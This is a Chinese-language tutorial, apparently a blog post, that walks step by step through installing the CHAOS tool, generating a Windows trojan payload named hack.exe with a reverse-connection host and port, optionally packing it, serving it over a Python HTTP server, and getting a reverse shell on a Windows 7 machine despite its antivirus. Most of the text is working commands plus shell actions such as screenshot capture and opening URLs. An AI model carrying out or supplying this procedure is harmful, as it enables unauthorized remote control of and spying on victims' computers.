CHAOS工具能够生成Windows 木马并且远程控制系统。

**1.安装CHAOS**

**apt-get install golang xterm upx-ucl -y **                      # 安装依赖关系

  

![](../Images/77e273a11b328c98922cec976377dce1.png)

  

**git clone ****https://github.com/tiagorlampert/CHAOS.git**           # clone CHAOS到本地

  

![](../Images/5f2bc75dffc2d5cba581bb91a320eb22.png)

  

**go get github.com/kbinani/screenshot && go get github.com/lxn/win**       # 获取一些第三方库

![](../Images/554598ec36a22d9944c0395db6d145b4.png)

  

****go install github.com/kbinani/screenshot && go install github.com/lxn/win**              # 工具需要生成有效的payload，必须安装一些windows第三方库**

![](../Images/7991228fa18f531adbe78de4f2db7bf9.png)

切换到CHAOS目录下  
**go run CHAOS.go **         # 运行脚本

![](../Images/f1f887231100634d0163167b13af9728.png)

  

**2.生成payload并监听端口**

选择一个选项:\[1\] Generate 生成payload

![](../Images/35e80ac45774d930176e4132aef08df2.png)

Lhost 192.168.0.33              # payload session返回的ip地址  
Lport 4444                             # payload session返回的端口  

  

最后输入payload的名称 ：hack.exe

![](../Images/c40b96aab86099e342832687592f24bf.png)

  

选择是否给payload加壳

![](../Images/d03506d44f485a4a7e5ae5f48e2ffd60.png)

  

点击立即开始服务文件：会弹出一个文件运行的窗口

![](../Images/800f82519f06d7aadd0ba6433c91fae4.png)

  

开始监听端口

![](../Images/04461fe96880fadfd02f4a16a4df3fb6.png)

  

hack.exe 就是我们生成的payload

![](../Images/95d636f2be4eefa642e3f42caf5b268a.png)

  

**3.将payload发送到windows主机**

**python -m SimpleHTTPServer**    # 新建窗口开启一个http服务器将路径下的文件共享出去

![](../Images/da87d64ccb1cb4070bd1c715dde4d2c3.png)

  

**mv hack.exe ../farmsec/**           # 将文件移动到我们http服务器路径下面

![](../Images/b9994043492a79ed8ab5ebdccabdbff8.png)

  

此时我windows主机开启了火绒杀软和360杀软

![](../Images/e5e8609f910e888e464ae63d4908698f.png)

  

访问我们的httpd服务器下载payload

![](../Images/3413453ed531e98b037f41dfd6a08678.png)

  

**4.运行payload**

Windows7点击运行payload，kali返回CHAOS监听窗口

![](../Images/6964d8e30cf2bd0e1f7863129bbfb705.png)

  

成功将windows7的shell返回到kali

![](../Images/3c08ba1688deac10c17aca6302a270a7.png)

**whoami**                # 查看当前系统用户

![](../Images/f32627165430fce725f840e60db34cad.png)

  

**help**                   # 查看命令行的帮助文件

![](../Images/5efce21b533c3e91c10b0c7271c225ca.png)

  

**getos **                     # 获取操作系统信息

![](../Images/1eb666b1527a2ec43f70c223a5d9bcdd.png)

  

**screenshot**               # 截取当前屏幕

![](../Images/219066891af4e2d20f52405d8cb92cea.png)

  

**openurl  **            # 浏览器打开指定的url

![](../Images/912f8b71891566476dc25c1361925440.png)
